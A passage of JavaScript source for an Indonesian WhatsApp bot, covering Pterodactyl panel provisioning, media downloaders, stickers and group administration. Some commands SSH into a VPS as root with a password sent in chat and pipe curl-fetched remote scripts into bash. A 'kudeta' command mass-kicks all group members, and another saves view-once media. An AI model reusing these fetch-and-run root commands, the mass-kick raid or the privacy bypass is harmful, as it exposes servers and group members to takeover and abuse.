"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV5
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domainV5 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV5,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await Reply("*Data Akun Sudah Dikirim Ke Private Chat*")
} else {
orang = m.chat
}
var teks = `𝐎𝐋𝐀 𝐈'𝐌 𝐃𝐀𝐍𝐙

 ╭─ 𝗗𝗔𝗧𝗔 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔 】
 │• 🖥 _ID SERVER_ : ${server.id} 
 │• 💾 _RAM_ : ${ram == "0" ? "Unlimited" : ram.charAt(0) + "GB"}
 │• 📈 _CPU_ : ${cpu == "0" ? "Unlimited" : cpu+"%"}
 │• 📡 _STORAGE_ : ${disknya == "0" ? "Unlimited" : disknya.charAt(0) + "GB"}
 │• 🗒️ _CREATED_ : ${desc}
 ╰────`
let messii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.namaOwner
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Login Server Panel\",\"url\":\"${global.domainV5}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qtext}) 
await danz.relayMessage(orang, messii.message, { 
messageId: messii.key.id 
})
global.panel = null
}
break

// 𝐁𝐚𝐭𝐚𝐬
case "tt": case "tiktok": {
if (!text) return m.reply(example("url"))
if (!text.startsWith("https://")) return m.reply(example("url"))
await tiktokDl(q).then(async (result) => {
await danz.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
if (!result.status) return m.reply("Error!")
if (result.durations == 0 && result.duration == "0 Seconds") {
let araara = new Array()
let urutan = 0
for (let a of result.data) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.url}`}}, { upload: danz.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `Foto Slide Ke *${urutan += 1}*`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const messii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*Tiktok Downloader ✅*"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await danz.relayMessage(m.chat, messii.message, { 
messageId: messii.key.id 
})
} else {
let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark")
await danz.sendMessage(m.chat, {video: {url: urlVid.url}, mimetype: 'video/mp4', caption: `*Tiktok Downloader ✅*`}, {quoted: m})
}
}).catch(e => console.log(e))
await danz.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//================================================================================

case "ssweb": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
const {
  screenshotV1, 
  screenshotV2,
  screenshotV3 
} = require('getscreenshot.js')
const fs = require('fs')
var data = await screenshotV2(text)
await danz.sendMessage(m.chat, { image: data, mimetype: "image/png"}, {quoted: m})
}
break

//================================================================================

case "shortlink": case "shorturl": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
var res = await axios.get('https://tinyurl.com/api-create.php?url='+encodeURIComponent(text))
var link = `
* *Shortlink by tinyurl.com*
${res.data.toString()}
`
return m.reply(link)
}
break


case "shortlink-dl": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
var a = await fetch(`https://moneyblink.com/st/?api=524de9dbd18357810a9e6b76810ace32d81a7d5f&url=${text}`)
await danz.sendMessage(m.chat, {text: a.url}, {quoted: m})
}
break

//================================================================================

case "idgc": case "cekidgc": {
if (!m.isGroup) return Reply(mess.group)
m.reply(m.chat)
}
break

//================================================================================

case "listgc": case "listgrup": {
let teks = `\n *#- List all group chat*\n`
let a = await danz.groupFetchAllParticipating()
let gc = Object.values(a)
teks += `\n* *Total group :* ${gc.length}\n`
for (const u of gc) {
teks += `\n* *ID :* ${u.id}
* *Nama :* ${u.subject}
* *Member :* ${u.participants.length}
* *Status :* ${u.announce == false ? "Terbuka": "Hanya Admin"}
* *Pembuat :* ${u?.subjectOwner ? u?.subjectOwner.split("@")[0] : "Sudah Keluar"}\n`
}
return m.reply(teks)
}
break

//================================================================================

case "cekidch": case "idch": {
if (!text) return m.reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await danz.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}
`
return m.reply(teks)
}
break

//================================================================================

case "pin": case "pinterest": {
if (!text) return m.reply(example("anime dark"))
await danz.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let pin = await pinterest2(text)
if (pin.length > 10) await pin.splice(0, 11)
const txts = text
let araara = new Array()
let urutan = 0
for (let a of pin) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.images_url}`}}, { upload: danz.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.images_url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const messii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: `\nBerikut adalah foto hasil pencarian dari *pinterest*`
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await danz.relayMessage(m.chat, messii.message, { 
messageId: messii.key.id 
})
await danz.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//================================================================================

case "ai": case "gpt": case "openai": {
let talk = text ? text : "hai"
await fetchJson("https://aemt.uk.to/prompt/gpt?prompt=Sekarang%20kamu%20adalah%20Skyzo-AI&text=" + talk).then(async (res) => {
await m.reply(res.result)
}).catch(e => m.reply(e.toString()))
}
break

//================================================================================

case "qc": {
if (!text) return m.reply(example('teksnya'))
let warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"]
var ppuser
try {
ppuser = await danz.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
}
const json = {
  "type": "quote",
  "format": "png",
  "backgroundColor": "#000000",
  "width": 812,
  "height": 968,
  "scale": 2,
  "messages": [
    {
      "entities": [],
      "avatar": true,
      "from": {
        "id": 1,
        "name": m.pushName,
        "photo": {
          "url": ppuser
        }
      },
      "text": text,
      "replyMessage": {}
    }
  ]
};
        const response = axios.post('https://bot.lyo.su/quote/generate', json, {
        headers: {'Content-Type': 'application/json'}
}).then(async (res) => {
    const buffer = Buffer.from(res.data.result.image, 'base64')
    let tempnya = "./database/sampah/"+m.sender+".png"
await fs.writeFile(tempnya, buffer, async (err) => {
if (err) return m.reply("Error")
await danz.sendAsSticker(m.chat, tempnya, m, {packname: global.packname})
await fs.unlinkSync(`${tempnya}`)
})
})
}
break

//================================================================================

case "s": case "sticker": case "stiker": {
if (!/image|video/gi.test(mime)) return m.reply(example("dengan kirim media"))
if (/video/gi.test(mime) && qmess.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
var image = await danz.downloadAndSaveMediaMessage(qmess)
await danz.sendAsSticker(m.chat, image, m, {packname: global.packname})
await fs.unlinkSync(image)
}
break

//================================================================================

case "swm": case "stickerwm": case "stikerwm": case "wm": {
if (!text) return m.reply(example("namamu dengan kirim media"))
if (!/image|video/gi.test(mime)) return m.reply(example("namamu dengan kirim media"))
if (/video/gi.test(mime) && qmess.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
var image = await danz.downloadAndSaveMediaMessage(qmess)
await danz.sendAsSticker(m.chat, image, m, {packname: text})
await fs.unlinkSync(image)
}
break

//================================================================================

case "rvo": case "readviewonce": {
if (!m.quoted) return m.reply(example("dengan reply pesannya"))
let mess = m.quoted.message
    let type = Object.keys(mess)[0]
if (!mess[type].viewOnce) return m.reply("Pesan itu bukan viewonce!")
    let media = await downloadContentFromMessage(mess[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return danz.sendMessage(m.chat, {video: buffer, caption: mess[type].caption || ""}, {quoted: m})
    } else if (/image/.test(type)) {
        return danz.sendMessage(m.chat, {image: buffer, caption: mess[type].caption || ""}, {quoted: m})
    } else if (/audio/.test(type)) {
        return danz.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    } 
}
break

//================================================================================

case "tourl": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
let media = await danz.downloadAndSaveMediaMessage(qmess)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('pixhost.to');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'danzpedia.png');

let teks = directLink.toString()
await danz.sendMessage(m.chat, {text: teks}, {quoted: m})
await fs.unlinkSync(media)
}
break

//================================================================================

case "tourl2": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
let media = await danz.downloadAndSaveMediaMessage(qmess)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('postimages.org');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'danzpedia.png');
let teks = directLink.toString()
await danz.sendMessage(m.chat, {text: teks}, {quoted: m})
await fs.unlinkSync(media)
}
break

//================================================================================

case "tr": case "translate": {
let language
let teks
let defaultLang = "en"
if (text || m.quoted) {
let translate = require('translate-google-api')
if (text && !m.quoted) {
if (args.length < 2) return m.reply(example("id good night"))
language = args[0]
teks = text.split(" ").slice(1).join(' ')
} else if (m.quoted) {
if (!text) return m.reply(example("id good night"))
if (args.length < 1) return m.reply(example("id good night"))
if (!m.quoted.text) return m.reply(example("id good night"))
language = args[0]
teks = m.quoted.text
}
let result
try {
result = await translate(`${teks}`, {to: language})
} catch (e) {
result = await translate(`${teks}`, {to: defaultLang})
} finally {
m.reply(result[0])
}
} else {
return m.reply(example("id good night"))
}}
break

//================================================================================

case "tohd": case "hd": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
let foto = await danz.downloadAndSaveMediaMessage(qmess)
let result = await remini(await fs.readFileSync(foto), "enhance")
await danz.sendMessage(m.chat, {image: result}, {quoted: m})
await fs.unlinkSync(foto)
}
break

//================================================================================

case "add": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (text) {
const input = text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await danz.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await danz.groupParticipantsUpdate(m.chat, [input], 'add')
if (Object.keys(res).length == 0) {
return m.reply(`Berhasil Menambahkan ${input.split("@")[0]} Kedalam Grup Ini`)
} else {
return m.reply(JSON.stringify(res, null, 2))
}} else {
return m.reply(example("62838###"))
}
}
break

//================================================================================

case "kick": case "kik": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (text || m.quoted) {
const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await danz.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await danz.groupParticipantsUpdate(m.chat, [input], 'remove')
await m.reply(`Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini`)
} else {
return m.reply(example("@tag/reply"))
}
}
break

//================================================================================

case "leave": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
await m.reply("Baik, Saya Akan Keluar Dari Grup Ini")
await sleep(4000)
await danz.groupLeave(m.chat)
}
break

//================================================================================

case "resetlinkgc": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
await danz.groupRevokeInvite(m.chat)
m.reply("Berhasil mereset link grup ✅")
}
break

//================================================================================

case "tagall": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!text) return m.reply(example("pesannya"))
let teks = text+"\n\n"
let member = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
await member.forEach((e) => {
teks += `@${e.split("@")[0]}\n`
})
await danz.sendMessage(m.chat, {text: teks, mentions: [...member]}, {quoted: m})
}
break

//================================================================================

case "linkgc": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
const urlGrup = "https://chat.whatsapp.com/" + await danz.groupInviteCode(m.chat)
var teks = `
${urlGrup}
`
await danz.sendMessage(m.chat, {text: teks, matchedText: `${urlGrup}`}, {quoted: m})
}
break

//================================================================================

case "ht": case "hidetag": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!text) return m.reply(example("pesannya"))
let member = m.metadata.participants.map(v => v.id)
await danz.sendMessage(m.chat, {text: text, mentions: [...member]}, {quoted: m})
}
break

//================================================================================

case "joingc": case "join": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("linkgcnya"))
if (!text.includes("chat.whatsapp.com")) return m.reply("Link tautan tidak valid")
let result = text.split('https://chat.whatsapp.com/')[1]
let id = await danz.groupAcceptInvite(result)
m.reply(`Berhasil bergabung ke dalam grup ${id}`)
}
break

//================================================================================

case "get": case "g": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("https://example.com"))
let data = await fetchJson(text)
m.reply(JSON.stringify(data, null, 2))
}
break

//================================================================================

case "joinch": case "joinchannel": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/") && !m.quoted.text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = m.quoted ? m.quoted.text.split('https://whatsapp.com/channel/')[1] : text.split('https://whatsapp.com/channel/')[1]
let res = await danz.newsletterMetadata("invite", result)
await danz.newsletterFollow(res.id)
m.reply(`
*Berhasil join channel whatsapp ✅*
* Nama channel : *${res.name}*
* Total pengikut : *${res.subscribers + 1}*
`)
}
break

//================================================================================

case "on": case "off": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
let gc = Object.keys(db.groups[m.chat])
if (!text || isNaN(text)) {
let teks = "\n*#- List opstion group settings*\n\n"
await gc.forEach((i, e) => {
teks += `* ${e + 1}. ${capital(i)} : ${db.groups[m.chat][i] ? "_aktif_" : "_tidak aktif_"}\n`
})
teks += `\n Contoh penggunaan *.${command}* 1\n`
return m.reply(teks)
}
const num = Number(text)
let total = gc.length
if (num > total) return
const event = gc[num - 1]
global.db.groups[m.chat][event] = command == "on" ? true : false
return m.reply(`Berhasil *${command == "on" ? "mengaktifkan" : "mematikan"} ${event}* di grup ini`)
}
break

//================================================================================

case "closegc": case "close": 
case "opengc": case "open": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (/open|opengc/.test(command)) {
if (m.metadata.announce == false) return 
await danz.groupSettingUpdate(m.chat, 'not_announcement')
} else if (/closegc|close/.test(command)) {
if (m.metadata.announce == true) return 
await danz.groupSettingUpdate(m.chat, 'announcement')
} else {}
}
break

//================================================================================

case "kudetagc": case "kudeta": {
if (!isCreator) return Reply(mess.owner)
let memberFilter = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
if (memberFilter.length < 1) return m.reply("Grup Ini Sudah Tidak Ada Member!")
await m.reply("Kudeta Grup By danz Starting 🔥")
for (let i of memberFilter) {
await danz.groupParticipantsUpdate(m.chat, [i], 'remove')
await sleep(1000)
}
await m.reply("Kudeta Grup Telah Berhasil 🏴‍☠️")
}
break

//================================================================================

case "demote":
case "promote": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (m.quoted || text) {
var action
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (/demote/.test(command)) action = "Demote"
if (/promote/.test(command)) action = "Promote"
await danz.groupParticipantsUpdate(m.chat, [target], action.toLowerCase()).then(async () => {
await danz.sendMessage(m.chat, {text: `Sukses ${action.toLowerCase()} @${target.split("@")[0]}`, mentions: [target]}, {quoted: m})
})
} else {
return m.reply(example("@tag/6285###"))
}
}
break

//================================================================================

case "uninstalltema": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

await m.reply("Memproses *uninstall* tema pterodactyl\nTunggu 1-10 menit hingga proses selsai")

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil *uninstall* tema pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`2\n`)
stream.write(`y\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "installtemastellar": case "installtemastelar": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (!isCreator) return Reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', async () => {
m.reply("Memproses install *tema stellar* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema stellar* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`1\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "installtemabilling": case "instaltemabiling": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
m.reply("Memproses install *tema billing* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema billing* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`2\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "installtemaenigma": 
case "instaltemaenigma": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
m.reply("Memproses install *tema enigma* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema enigma* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`); // Key Token : skyzodev
stream.write('1\n');
stream.write('3\n');
stream.write('https://wa.me/6285624297893\n');
stream.write('https://whatsapp.com/channel/0029VaYoztA47XeAhs447Y1s\n');
stream.write('https://chat.whatsapp.com/IP1KjO4OyM97ay2iEsSAFy\n');
stream.write('yes\n');
stream.write('x\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "uninstallpanel": {
if (!isCreator) return m.reply(mess.owner);
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
var vpsnya = text.split("|")
if (vpsnya.length < 2) return m.reply(example("ipvps|pwvps|domain"))
let ipvps = vpsnya[0]
let passwd = vpsnya[1]
const connSettings = {
host: ipvps, port: '22', username: 'root', password: passwd
}
const boostmysql = `\n`
const command = `bash <(curl -s https://pterodactyl-installer.se)`
const ress = new Client();
ress.on('ready', async () => {

await m.reply("Memproses *uninstall* server panel\nTunggu 1-10 menit hingga proses selsai")

ress.exec(command, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await ress.exec(boostmysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await m.reply("Berhasil *uninstall* server panel ✅")
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Remove all MariaDB databases? [yes/no]`)) {
await stream.write("\x09\n")
}
}).stderr.on('data', (data) => {
m.reply('Berhasil Uninstall Server Panel ✅');
});
})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Input 0-6`)) {
await stream.write("6\n")
}
if (data.toString().includes(`(y/N)`)) {
await stream.write("y\n")
}
if (data.toString().includes(`* Choose the panel user (to skip don\'t input anything):`)) {
await stream.write("\n")
}
if (data.toString().includes(`* Choose the panel database (to skip don\'t input anything):`)) {
await stream.write("\n")
}
}).stderr.on('data', (data) => {
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
m.reply('Katasandi atau IP tidak valid')
}).connect(connSettings)
}
break

//================================================================================

case "installpanel": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let vii = text.split("|")
if (vii.length < 5) return m.reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let sukses = false

const ress = new Client();
const connSettings = {
 host: vii[0],
 port: '22',
 username: 'root',
 password: vii[1]
}

const pass = "admin" + getRandom("")
let passwordPanel = pass
const domainpanel = vii[2]
const domainnode = vii[3]
const ramserver = vii[4]
const deletemysql = `\n`
const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`

async function instalWings() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
ress.exec('bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/createnode.sh)', async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
let teks = `
*Berikut Detail Akun Panel :*

* *Username :* admin
* *Password :* ${passwordPanel}
* *Domain :* ${domainpanel}

*Note :* Silahkan Buat Allocation & Ambil Token Wings Di Node Yang Sudah Di Buat Oleh Bot Untuk Menjalankan Wings

*Cara Menjalankan Wings :*
ketik *.startwings* ipvps|pwvps|tokenwings
`
await danz.sendMessage(m.chat, {text: teks}, {quoted: m})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes("Masukkan nama lokasi: ")) {
stream.write('Singapore\n');
}
if (data.toString().includes("Masukkan deskripsi lokasi: ")) {
stream.write('Node By Skyzo\n');
}
if (data.toString().includes("Masukkan domain: ")) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes("Masukkan nama node: ")) {
stream.write('Node By Skyzo\n');
}
if (data.toString().includes("Masukkan RAM (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan jumlah maksimum disk space (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan Locid: ")) {
stream.write('1\n');
}
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('1\n');
}
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Enter the panel address (blank for any address)')) {
stream.write(`${domainpanel}\n`);
}
if (data.toString().includes('Database host username (pterodactyluser)')) {
stream.write('admin\n');
}
if (data.toString().includes('Database host password')) {
stream.write(`admin\n`);
}
if (data.toString().includes('Set the FQDN to use for Let\'s Encrypt (node.example.com)')) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes('Enter email address for Let\'s Encrypt')) {
stream.write('admin@gmail.com\n');
}
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
})
}

async function instalPanel() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalWings()
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('0\n');
} 
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
} 
